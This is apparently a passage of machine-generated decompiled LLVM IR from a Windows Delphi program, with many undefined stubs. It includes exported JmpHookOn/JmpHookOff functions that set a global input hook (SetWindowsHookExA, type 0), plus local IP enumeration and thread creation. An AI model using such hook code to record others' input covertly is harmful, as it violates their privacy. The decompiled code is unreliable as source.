  %20 = call i1 @IsWindow(i32* nonnull @0), !insn.addr !1802
  %21 = icmp eq i1 %20, false, !insn.addr !1803
  %22 = icmp eq i1 %21, false, !insn.addr !1804
  store i32 %storemerge, i32* %storemerge3.reg2mem, !insn.addr !1804
  store i32 %15, i32* %esp.02.reg2mem, !insn.addr !1804
  store i32 %15, i32* %esp.0.lcssa.reg2mem, !insn.addr !1804
  store i32* %19, i32** %.lcssa.reg2mem, !insn.addr !1804
  br i1 %22, label %dec_label_pc_407158, label %dec_label_pc_407198, !insn.addr !1804

dec_label_pc_407198:                              ; preds = %dec_label_pc_407158, %dec_label_pc_407134
  %.lcssa.reload = load i32*, i32** %.lcssa.reg2mem
  %esp.0.lcssa.reload = load i32, i32* %esp.0.lcssa.reg2mem
  %23 = load i32, i32* %.lcssa.reload, align 4, !insn.addr !1810
  call void @__writefsdword(i32 0, i32 %23), !insn.addr !1811
  %24 = add i32 %esp.0.lcssa.reload, 4, !insn.addr !1812
  %25 = inttoptr i32 %24 to i32*, !insn.addr !1812
  store i32 4223413, i32* %25, align 4, !insn.addr !1812
  %26 = call i32 @"@LStrClr"(), !insn.addr !1813
  ret i32 %26, !insn.addr !1814
}

define i32 @function_4071ae() local_unnamed_addr {
dec_label_pc_4071ae:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1815
  ret i32 %0, !insn.addr !1815
}

define i32 @function_4071b3() local_unnamed_addr {
dec_label_pc_4071b3:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1816
}

define i32 @function_4071b5(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_4071b5:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1817
}

define i32 @function_4071c0() local_unnamed_addr {
dec_label_pc_4071c0:
  %stack_var_-28 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1818
  store i32 %0, i32* %stack_var_-28, align 4, !insn.addr !1818
  %1 = ptrtoint i32* %stack_var_-28 to i32, !insn.addr !1818
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1819
  %2 = call i32 @function_407054(), !insn.addr !1820
  %3 = call i32 @"@LStrCmp"(), !insn.addr !1821
  %4 = call i32 @function_407134(), !insn.addr !1822
  %5 = load i32, i32* %stack_var_-28, align 4, !insn.addr !1823
  call void @__writefsdword(i32 0, i32 %5), !insn.addr !1824
  %6 = call i32 @"@LStrClr"(), !insn.addr !1825
  ret i32 %6, !insn.addr !1826
}

define i32 @function_407221() local_unnamed_addr {
dec_label_pc_407221:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1827
  ret i32 %0, !insn.addr !1827
}

define i32 @function_407226() local_unnamed_addr {
dec_label_pc_407226:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1828
}

define i32 @function_407228(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_407228:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1829
}

define i32 @function_407243() local_unnamed_addr {
dec_label_pc_407243:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %3 = add i32 %0, 1, !insn.addr !1830
  %4 = inttoptr i32 %0 to i32*, !insn.addr !1830
  store i32 %3, i32* %4, align 4, !insn.addr !1830
  %5 = bitcast i32* %eax to i8*
  %6 = load i8, i8* %5, align 4, !insn.addr !1831
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !1831
  %9 = add i8 %6, %8, !insn.addr !1831
  %10 = inttoptr i32 %7 to i8*, !insn.addr !1831
  store i8 %9, i8* %10, align 1, !insn.addr !1831
  %11 = add i32 %2, 81, !insn.addr !1832
  %12 = inttoptr i32 %11 to i8*, !insn.addr !1832
  %13 = load i8, i8* %12, align 1, !insn.addr !1832
  %14 = trunc i32 %1 to i8, !insn.addr !1832
  %15 = add i8 %13, %14, !insn.addr !1832
  store i8 %15, i8* %12, align 1, !insn.addr !1832
  %16 = load i32, i32* %eax, align 4, !insn.addr !1833
  ret i32 %16, !insn.addr !1833
}

define x86_fp80 @function_40724b() local_unnamed_addr {
dec_label_pc_40724b:
  %0 = call x86_fp80 @__decompiler_undefined_function_11()
  %1 = fadd x86_fp80 %0, %0, !insn.addr !1834
  ret x86_fp80 %1, !insn.addr !1835
}

define i32 @function_407250() local_unnamed_addr {
dec_label_pc_407250:
  %esp.1.in.reg2mem = alloca i32*, !insn.addr !1836
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !1837
  store i32 %1, i32* %stack_var_-24, align 4, !insn.addr !1837
  %2 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !1837
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !1838
  %3 = call i32 @function_407054(), !insn.addr !1839
  %4 = call i32 @"@LStrCmp"(), !insn.addr !1840
  %5 = call i32 @GetWindowLongA(i32* inttoptr (i32 -12 to i32*), i32 %0), !insn.addr !1841
  %6 = icmp eq i32 %5, 180, !insn.addr !1842
  store i32* %stack_var_-32, i32** %esp.1.in.reg2mem, !insn.addr !1843
  br i1 %6, label %dec_label_pc_4072b3, label %dec_label_pc_40728e, !insn.addr !1843

dec_label_pc_40728e:                              ; preds = %dec_label_pc_407250
  %7 = call i32 @GetWindowLongA(i32* inttoptr (i32 -16 to i32*), i32 %0), !insn.addr !1844
  %8 = and i32 %7, 32
  %9 = icmp eq i32 %8, 0, !insn.addr !1845
  %10 = icmp eq i1 %9, false, !insn.addr !1846
  store i32* %stack_var_-40, i32** %esp.1.in.reg2mem, !insn.addr !1846
  br i1 %10, label %dec_label_pc_4072b3, label %dec_label_pc_40729a, !insn.addr !1846

dec_label_pc_40729a:                              ; preds = %dec_label_pc_40728e
  %11 = call i32 @SendMessageA(i32* null, i32 0, i32 210, i32 %0), !insn.addr !1847
  store i32* %stack_var_-56, i32** %esp.1.in.reg2mem
  br label %dec_label_pc_4072b3

dec_label_pc_4072b3:                              ; preds = %dec_label_pc_40729a, %dec_label_pc_407250, %dec_label_pc_40728e
  %esp.1.in.reload = load i32*, i32** %esp.1.in.reg2mem
  %esp.1 = ptrtoint i32* %esp.1.in.reload to i32
  %12 = load i32, i32* %esp.1.in.reload, align 4, !insn.addr !1848
  call void @__writefsdword(i32 0, i32 %12), !insn.addr !1849
  %13 = add i32 %esp.1, 8, !insn.addr !1850
  %14 = inttoptr i32 %13 to i32*, !insn.addr !1850
  store i32 4223702, i32* %14, align 4, !insn.addr !1850
  %15 = call i32 @"@LStrClr"(), !insn.addr !1851
  ret i32 %15, !insn.addr !1852
}

define i32 @function_4072cf() local_unnamed_addr {
dec_label_pc_4072cf:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1853
  ret i32 %0, !insn.addr !1853
}

define i32 @function_4072d4() local_unnamed_addr {
dec_label_pc_4072d4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1854
}

define i32 @function_4072d6(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4072d6:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1855
}

define i32 @function_4072ec() local_unnamed_addr {
dec_label_pc_4072ec:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %2 = inttoptr i32 %0 to i32*, !insn.addr !1856
  %3 = call i32* @GetDC(i32* %2), !insn.addr !1856
  %4 = ptrtoint i32* %3 to i32, !insn.addr !1856
  %5 = call i32 @SendMessageA(i32* null, i32 0, i32 49, i32 %1), !insn.addr !1857
  %6 = inttoptr i32 %5 to i32*, !insn.addr !1858
  %7 = call i32* @SelectObject(i32* %6, i32* %3), !insn.addr !1858
  %8 = call i1 @GetCharWidthA(i32* nonnull %stack_var_-40, i32 42, i32 42, i32* %3), !insn.addr !1859
  %9 = call i32* @GetStockObject(i32 10), !insn.addr !1860
  %10 = call i32* @SelectObject(i32* %9, i32* %3), !insn.addr !1861
  %11 = inttoptr i32 %1 to i32*, !insn.addr !1862
  %12 = call i32 @ReleaseDC(i32* %3, i32* %11), !insn.addr !1862
  %13 = bitcast i32* %stack_var_-84 to %tagPOINT*
  %14 = call i1 @GetCaretPos(%tagPOINT* nonnull %13), !insn.addr !1863
  %15 = ptrtoint i32* %stack_var_-84 to i32, !insn.addr !1864
  %16 = ashr i32 %15, 31, !insn.addr !1865
  %17 = zext i32 %15 to i64, !insn.addr !1866
  %18 = zext i32 %16 to i64, !insn.addr !1866
  %19 = mul i64 %18, 4294967296, !insn.addr !1866
  %20 = or i64 %19, %17, !insn.addr !1866
  %21 = zext i32 %4 to i64, !insn.addr !1866
  %22 = sdiv i64 %20, %21, !insn.addr !1866
  %23 = trunc i64 %22 to i32, !insn.addr !1866
  ret i32 %23, !insn.addr !1867
}

define i32 @function_407348() local_unnamed_addr {
dec_label_pc_407348:
  %esp.0.reg2mem = alloca i32, !insn.addr !1868
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1869
  store i32 %0, i32* %stack_var_-28, align 4, !insn.addr !1869
  %1 = ptrtoint i32* %stack_var_-28 to i32, !insn.addr !1869
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1870
  %2 = load i32, i32* @global_var_408154, align 4, !insn.addr !1871
  %3 = icmp eq i32 %2, 0, !insn.addr !1871
  br i1 %3, label %dec_label_pc_407384, label %dec_label_pc_407371, !insn.addr !1872

dec_label_pc_407371:                              ; preds = %dec_label_pc_407348
  %4 = inttoptr i32 %2 to i32*, !insn.addr !1873
  store i32 0, i32* %4, align 4, !insn.addr !1873
  br label %dec_label_pc_407384, !insn.addr !1874

dec_label_pc_407384:                              ; preds = %dec_label_pc_407371, %dec_label_pc_407348
  %5 = load i32, i32* @global_var_40813c, align 4, !insn.addr !1875
  %6 = icmp eq i32 %5, 0, !insn.addr !1875
  br i1 %6, label %dec_label_pc_407398, label %dec_label_pc_40738e, !insn.addr !1876

dec_label_pc_40738e:                              ; preds = %dec_label_pc_407384
  %7 = load i32, i32* @global_var_408140, align 4, !insn.addr !1877
  %8 = icmp eq i32 %7, 0, !insn.addr !1877
  %9 = icmp eq i1 %8, false, !insn.addr !1878
  br i1 %9, label %dec_label_pc_4073a2, label %dec_label_pc_407398, !insn.addr !1878

dec_label_pc_407398:                              ; preds = %dec_label_pc_40738e, %dec_label_pc_407384
  %10 = call i32 @function_40747c(), !insn.addr !1879
  store i32 %1, i32* %esp.0.reg2mem, !insn.addr !1880
  br label %dec_label_pc_40743f, !insn.addr !1880

dec_label_pc_4073a2:                              ; preds = %dec_label_pc_40738e
  %11 = load i8, i8* bitcast (i32** @global_var_408160 to i8*), align 4, !insn.addr !1881
  %12 = icmp eq i8 %11, 0, !insn.addr !1881
  br i1 %12, label %dec_label_pc_4073cb, label %dec_label_pc_4073ac, !insn.addr !1882

dec_label_pc_4073ac:                              ; preds = %dec_label_pc_4073a2
  %13 = call i32 @function_406c64(), !insn.addr !1883
  %14 = icmp eq i32 %13, 0, !insn.addr !1884
  br i1 %14, label %dec_label_pc_4073cb, label %dec_label_pc_4073c4, !insn.addr !1885

dec_label_pc_4073c4:                              ; preds = %dec_label_pc_4073ac
  %15 = call i32 @function_40747c(), !insn.addr !1886
  store i32 %1, i32* %esp.0.reg2mem, !insn.addr !1887
  br label %dec_label_pc_40743f, !insn.addr !1887

dec_label_pc_4073cb:                              ; preds = %dec_label_pc_4073ac, %dec_label_pc_4073a2
  %16 = call i32 @"@LStrCatN"(), !insn.addr !1888
  %17 = call i32 @"@LStrAsg"(), !insn.addr !1889
  %18 = bitcast i32* %stack_var_-12 to %_SECURITY_ATTRIBUTES*
  %19 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %18, i32 0, i32 (i32*)* inttoptr (i32 2 to i32 (i32*)*), i32* inttoptr (i32 4219720 to i32*), i32 0, i32* null), !insn.addr !1890
  %20 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %18, i32 0, i32 (i32*)* inttoptr (i32 1 to i32 (i32*)*), i32* inttoptr (i32 4219720 to i32*), i32 0, i32* null), !insn.addr !1891
  store i32 0, i32* %stack_var_-112, align 4, !insn.addr !1892
  %21 = ptrtoint i32* %stack_var_-112 to i32, !insn.addr !1892
  %22 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %18, i32 0, i32 (i32*)* null, i32* inttoptr (i32 4219720 to i32*), i32 0, i32* null), !insn.addr !1893
  %23 = call i32 @function_40747c(), !insn.addr !1894
  store i32 %21, i32* %esp.0.reg2mem, !insn.addr !1894
  br label %dec_label_pc_40743f, !insn.addr !1894

dec_label_pc_40743f:                              ; preds = %dec_label_pc_4073cb, %dec_label_pc_4073c4, %dec_label_pc_407398
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %24 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !1895
  %25 = load i32, i32* %24, align 4, !insn.addr !1895
  call void @__writefsdword(i32 0, i32 %25), !insn.addr !1896
  %26 = add i32 %esp.0.reload, 8, !insn.addr !1897
  %27 = inttoptr i32 %26 to i32*, !insn.addr !1897
  store i32 4224092, i32* %27, align 4, !insn.addr !1897
  %28 = call i32 @"@LStrClr"(), !insn.addr !1898
  ret i32 %28, !insn.addr !1899
}

define i32 @function_407455() local_unnamed_addr {
dec_label_pc_407455:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1900
  ret i32 %0, !insn.addr !1900
}

define i32 @function_40745a() local_unnamed_addr {
dec_label_pc_40745a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1901
}

define i32 @function_40745c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_40745c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1902
}

define i32 @function_40747c() local_unnamed_addr {
dec_label_pc_40747c:
  %0 = call i32 @"@LStrClr"(), !insn.addr !1903
  %1 = call i32 @"@LStrClr"(), !insn.addr !1904
  ret i32 %1, !insn.addr !1905
}

define i32 @function_407494() local_unnamed_addr {
dec_label_pc_407494:
  %eax.0.reg2mem = alloca i32, !insn.addr !1906
  %esp.0.reg2mem = alloca i32, !insn.addr !1906
  %esp.15.reg2mem = alloca i32, !insn.addr !1906
  %storemerge6.reg2mem = alloca i32, !insn.addr !1906
  %.reg2mem = alloca i32, !insn.addr !1906
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-500 = alloca i8*, align 4
  %stack_var_-496 = alloca i32, align 4
  %stack_var_-488 = alloca i32, align 4
  %2 = trunc i32 %1 to i16, !insn.addr !1906
  %3 = inttoptr i32 %0 to %WSAData*, !insn.addr !1907
  store i32 257, i32* %stack_var_-488, align 4, !insn.addr !1908
  %4 = call i32 @WSAStartup(i16 %2, %WSAData* %3), !insn.addr !1909
  %5 = call i32 @"@LStrClr"(), !insn.addr !1910
  %6 = ptrtoint i32* %stack_var_-488 to i32, !insn.addr !1911
  store i32 %6, i32* %stack_var_-496, align 4, !insn.addr !1911
  %7 = call i32 @gethostname(i8* inttoptr (i32 64 to i8*), i32 %6), !insn.addr !1912
  %8 = bitcast i32* %stack_var_-496 to i8*
  store i8* %8, i8** %stack_var_-500, align 4, !insn.addr !1913
  %9 = call %hostent* @gethostbyname(i8* nonnull %8), !insn.addr !1914
  %10 = ptrtoint %hostent* %9 to i32, !insn.addr !1914
  %11 = icmp eq %hostent* %9, null, !insn.addr !1915
  store i32 %10, i32* %eax.0.reg2mem, !insn.addr !1916
  br i1 %11, label %dec_label_pc_4074f2, label %dec_label_pc_4074cc, !insn.addr !1916

dec_label_pc_4074cc:                              ; preds = %dec_label_pc_407494
  %12 = add i32 %10, 12, !insn.addr !1917
  %13 = inttoptr i32 %12 to i32*, !insn.addr !1917
  %14 = load i32, i32* %13, align 4, !insn.addr !1917
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1918
  %16 = load i32, i32* %15, align 4, !insn.addr !1918
  %17 = icmp eq i32 %16, 0, !insn.addr !1919
  %18 = icmp eq i1 %17, false, !insn.addr !1920
  br i1 %18, label %dec_label_pc_4074d3.lr.ph, label %dec_label_pc_4074ed, !insn.addr !1920

dec_label_pc_4074d3.lr.ph:                        ; preds = %dec_label_pc_4074cc
  %19 = ptrtoint i8** %stack_var_-500 to i32, !insn.addr !1913
  store i32 %16, i32* %.reg2mem
  store i32 0, i32* %storemerge6.reg2mem
  store i32 %19, i32* %esp.15.reg2mem
  br label %dec_label_pc_4074d3

dec_label_pc_4074d3:                              ; preds = %dec_label_pc_4074d3.lr.ph, %dec_label_pc_4074e5
  %esp.15.reload = load i32, i32* %esp.15.reg2mem
  %storemerge6.reload = load i32, i32* %storemerge6.reg2mem
  %20 = icmp eq i32 %storemerge6.reload, 0, !insn.addr !1921
  %21 = icmp eq i1 %20, false, !insn.addr !1922
  store i32 %esp.15.reload, i32* %esp.0.reg2mem, !insn.addr !1922
  br i1 %21, label %dec_label_pc_4074e5, label %dec_label_pc_4074d7, !insn.addr !1922

dec_label_pc_4074d7:                              ; preds = %dec_label_pc_4074d3
  %.reload = load i32, i32* %.reg2mem
  %22 = inttoptr i32 %.reload to i32*, !insn.addr !1923
  %23 = load i32, i32* %22, align 4, !insn.addr !1923
  %24 = add i32 %esp.15.reload, -4, !insn.addr !1923
  %25 = inttoptr i32 %24 to i32*, !insn.addr !1923
  store i32 %23, i32* %25, align 4, !insn.addr !1923
  %26 = call i8* @inet_ntoa(%in_addr { i32 ptrtoint (i32* @0 to i32) }), !insn.addr !1924
  %27 = call i32 @StrPas(), !insn.addr !1925
  store i32 %24, i32* %esp.0.reg2mem, !insn.addr !1925
  br label %dec_label_pc_4074e5, !insn.addr !1925

dec_label_pc_4074e5:                              ; preds = %dec_label_pc_4074d7, %dec_label_pc_4074d3
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %28 = add i32 %storemerge6.reload, 1, !insn.addr !1926
  %29 = mul i32 %28, 4, !insn.addr !1918
  %30 = add i32 %29, %14, !insn.addr !1918
  %31 = inttoptr i32 %30 to i32*, !insn.addr !1918
  %32 = load i32, i32* %31, align 4, !insn.addr !1918
  %33 = icmp eq i32 %32, 0, !insn.addr !1919
  %34 = icmp eq i1 %33, false, !insn.addr !1920
  store i32 %32, i32* %.reg2mem, !insn.addr !1920
  store i32 %28, i32* %storemerge6.reg2mem, !insn.addr !1920
  store i32 %esp.0.reload, i32* %esp.15.reg2mem, !insn.addr !1920
  br i1 %34, label %dec_label_pc_4074d3, label %dec_label_pc_4074ed, !insn.addr !1920

dec_label_pc_4074ed:                              ; preds = %dec_label_pc_4074e5, %dec_label_pc_4074cc
  %35 = call i32 @WSACleanup(), !insn.addr !1927
  store i32 %35, i32* %eax.0.reg2mem, !insn.addr !1927
  br label %dec_label_pc_4074f2, !insn.addr !1927

dec_label_pc_4074f2:                              ; preds = %dec_label_pc_4074ed, %dec_label_pc_407494
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !1928
}

define i32 @function_407500() local_unnamed_addr {
dec_label_pc_407500:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1929
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1929
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1929
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1930
  %2 = load i32, i32* @global_var_4096e0, align 4, !insn.addr !1931
  %3 = add i32 %2, 1, !insn.addr !1931
  store i32 %3, i32* @global_var_4096e0, align 4, !insn.addr !1931
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1932
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1933
  ret i32 0, !insn.addr !1934
}

define i32 @function_407525() local_unnamed_addr {
dec_label_pc_407525:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1935
  ret i32 %0, !insn.addr !1935
}

define i32 @function_40752a() local_unnamed_addr {
dec_label_pc_40752a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1936
}

define i32 @function_40752c(i32 %arg1) local_unnamed_addr {
dec_label_pc_40752c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1937
}

define i32 @function_407530() local_unnamed_addr {
dec_label_pc_407530:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096e0, align 4, !insn.addr !1938
  %2 = add i32 %1, -1, !insn.addr !1938
  store i32 %2, i32* @global_var_4096e0, align 4, !insn.addr !1938
  ret i32 %0, !insn.addr !1939
}

define i32 @function_407538(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_407538:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = inttoptr i32 %0 to i32*, !insn.addr !1940
  %2 = call i32 @CallNextHookEx(i32* %1, i32 %arg1, i32 %arg2, i32 %arg3), !insn.addr !1940
  ret i32 %2, !insn.addr !1941
}

define i32 @JmpHookOn() local_unnamed_addr {
dec_label_pc_407558:
  %0 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %1 = call i32* @SetWindowsHookExA(i32 0, i32 (i32, i32, i32)* %0, i32* inttoptr (i32 4224312 to i32*), i32 3), !insn.addr !1942
  %2 = ptrtoint i32* %1 to i32, !insn.addr !1942
  store i32 %2, i32* @global_var_4096e8, align 4, !insn.addr !1943
  %3 = icmp eq i32* %1, null, !insn.addr !1944
  %4 = icmp eq i1 %3, false, !insn.addr !1945
  %5 = sext i1 %4 to i32, !insn.addr !1946
  ret i32 %5, !insn.addr !1947
}

define i32 @JmpHookOff() local_unnamed_addr {
dec_label_pc_407584:
  %0 = load i32, i32* @global_var_4096e8, align 4, !insn.addr !1948
  %1 = inttoptr i32 %0 to i32*, !insn.addr !1949
  %2 = call i1 @UnhookWindowsHookEx(i32* %1), !insn.addr !1949
  %3 = sext i1 %2 to i32, !insn.addr !1949
  ret i32 %3, !insn.addr !1950
}

define i32 @function_407590() local_unnamed_addr {
dec_label_pc_407590:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1951
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1951
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1951
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1952
  %2 = load i32, i32* @global_var_4096e4, align 4, !insn.addr !1953
  %3 = add i32 %2, 1, !insn.addr !1953
  store i32 %3, i32* @global_var_4096e4, align 4, !insn.addr !1953
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1954
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1955
  ret i32 0, !insn.addr !1956
}

define i32 @function_4075b5() local_unnamed_addr {
dec_label_pc_4075b5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1957
  ret i32 %0, !insn.addr !1957
}

define i32 @function_4075ba() local_unnamed_addr {
dec_label_pc_4075ba:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1958
}

define i32 @function_4075bc(i32 %arg1) local_unnamed_addr {
dec_label_pc_4075bc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1959
}

define i32 @function_4075c0() local_unnamed_addr {
dec_label_pc_4075c0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096e4, align 4, !insn.addr !1960
  %2 = add i32 %1, -1, !insn.addr !1960
  store i32 %2, i32* @global_var_4096e4, align 4, !insn.addr !1960
  ret i32 %0, !insn.addr !1961
}

define i32* @function_4075c8(i32* %Base, i8 %MappedAsImage, i16 %DirectoryEntry, i32* %Size) local_unnamed_addr {
dec_label_pc_4075c8:
  %0 = call i32* @ImageDirectoryEntryToData(i32* %Base, i8 %MappedAsImage, i16 %DirectoryEntry, i32* %Size), !insn.addr !1962
  ret i32* %0, !insn.addr !1962
}

define i32 @function_4075d0() local_unnamed_addr {
dec_label_pc_4075d0:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1963
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1963
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1963
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1964
  %2 = load i32, i32* @global_var_4096ec, align 4, !insn.addr !1965
  %3 = add i32 %2, 1, !insn.addr !1965
  store i32 %3, i32* @global_var_4096ec, align 4, !insn.addr !1965
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1966
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1967
  ret i32 0, !insn.addr !1968
}

define i32 @function_4075f5() local_unnamed_addr {
dec_label_pc_4075f5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1969
  ret i32 %0, !insn.addr !1969
}

define i32 @function_4075fa() local_unnamed_addr {
dec_label_pc_4075fa:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1970
}

define i32 @function_4075fc(i32 %arg1) local_unnamed_addr {
dec_label_pc_4075fc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1971
}

define i32 @function_407600() local_unnamed_addr {
dec_label_pc_407600:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096ec, align 4, !insn.addr !1972
  %2 = add i32 %1, -1, !insn.addr !1972
  store i32 %2, i32* @global_var_4096ec, align 4, !insn.addr !1972
  ret i32 %0, !insn.addr !1973
}

define i32 @function_407660(i8* %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_407660:
  %esp.1.reg2mem = alloca i32, !insn.addr !1974
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !1974
  %eax.0.reg2mem = alloca i32, !insn.addr !1974
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %6 = trunc i32 %4 to i8, !insn.addr !1975
  %7 = icmp eq i8 %6, 0, !insn.addr !1975
  store i32* %stack_var_-20, i32** %esp.0.in.reg2mem, !insn.addr !1976
  br i1 %7, label %dec_label_pc_407673, label %dec_label_pc_40766b, !insn.addr !1976

dec_label_pc_40766b:                              ; preds = %dec_label_pc_407660
  %8 = call i32 @"@ClassCreate"(i32 %2, i32 %5, i32 %3, i32 %1, i32 %0), !insn.addr !1977
  store i32 %8, i32* %eax.0.reg2mem, !insn.addr !1977
  store i32* %stack_var_-36, i32** %esp.0.in.reg2mem, !insn.addr !1977
  br label %dec_label_pc_407673, !insn.addr !1977

dec_label_pc_407673:                              ; preds = %dec_label_pc_40766b, %dec_label_pc_407660
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %9 = add i32 %esp.0, -4, !insn.addr !1978
  %10 = and i32 %4, 255
  %11 = inttoptr i32 %10 to i8*, !insn.addr !1979
  %12 = call i32* @GetModuleHandleA(i8* %11), !insn.addr !1979
  %13 = ptrtoint i32* %12 to i32, !insn.addr !1979
  %14 = add i32 %eax.0.reload, 8, !insn.addr !1980
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1980
  store i32 %13, i32* %15, align 4, !insn.addr !1980
  %16 = icmp eq i32* %12, null, !insn.addr !1981
  store i32 %9, i32* %esp.1.reg2mem, !insn.addr !1982
  br i1 %16, label %dec_label_pc_4076cb, label %dec_label_pc_40768f, !insn.addr !1982

dec_label_pc_40768f:                              ; preds = %dec_label_pc_407673
  %17 = ptrtoint i8* %arg1 to i32, !insn.addr !1983
  %18 = add i32 %eax.0.reload, 12, !insn.addr !1984
  %19 = inttoptr i32 %18 to i32*, !insn.addr !1984
  store i32 %17, i32* %19, align 4, !insn.addr !1984
  %20 = ptrtoint i8* %arg2 to i32, !insn.addr !1985
  %21 = add i32 %eax.0.reload, 16, !insn.addr !1986
  %22 = inttoptr i32 %21 to i32*, !insn.addr !1986
  store i32 %20, i32* %22, align 4, !insn.addr !1986
  %23 = add i32 %eax.0.reload, 20, !insn.addr !1987
  %24 = inttoptr i32 %23 to i32*, !insn.addr !1987
  store i32 %arg3, i32* %24, align 4, !insn.addr !1987
  %25 = load i32, i32* %22, align 4, !insn.addr !1988
  %26 = add i32 %esp.0, -8, !insn.addr !1989
  %27 = inttoptr i32 %26 to i32*, !insn.addr !1989
  store i32 %25, i32* %27, align 4, !insn.addr !1989
  %28 = add i32 %esp.0, -12, !insn.addr !1990
  %29 = inttoptr i32 %28 to i32*, !insn.addr !1990
  store i32 %17, i32* %29, align 4, !insn.addr !1990
